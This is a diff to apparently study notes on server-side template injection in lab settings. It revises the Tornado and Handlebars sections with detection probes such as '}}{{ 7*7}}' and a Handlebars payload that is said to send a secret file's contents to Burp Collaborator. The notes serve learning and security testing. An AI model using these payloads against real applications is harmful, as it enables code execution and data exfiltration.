@@ -2186,11 +2186,11 @@ ${foobar}
 {% debug %}
 ```  
 
->***Identification*** of template injection.  
+### Tornado  
+
+>***Identification*** of tornado template framework after testing injection with ```}}{{ 7*7}}```.  
 
 ![Identify SSTI](images/identify-ssti.png)  
-
-### Tornado  
 
 >Tornado Template can be ***identified*** using a ```}}{{ 7*7}}``` payload that breakout of current expression and evaluate ```7*7```.  
 
@@ -2261,11 +2261,13 @@ ${foobar}
 
 ### Handlebars  
 
->Handlebars Template  
+>Handlebars Template can be identified by injecting below set of characters and not encoding them into the ```/?message=``` parameter. [SSTIMAP](https://github.com/vladko312/SSTImap) was not able to identify this handlebars SSTI vulnerability.  
 
 ```
 ${{<%[%'"}}%\,
 ```  
+
+![identified-ssti-handlebars.png](images/identified-ssti-handlebars.png)  
 
 ```
 wrtz{{#with "s" as |string|}}
@@ -2288,6 +2290,8 @@ wrtz{{#with "s" as |string|}}
     {{/with}}
 {{/with}}
 ```
+
+>Before URL encoding the payload above, it is not required to remove newline breaks or spaces. The above payload will send the contents of ```/home /carlos/secret``` to Burp Collaborator.  
 
 ![Handlebars template](images/handlebars-template.png)  
 
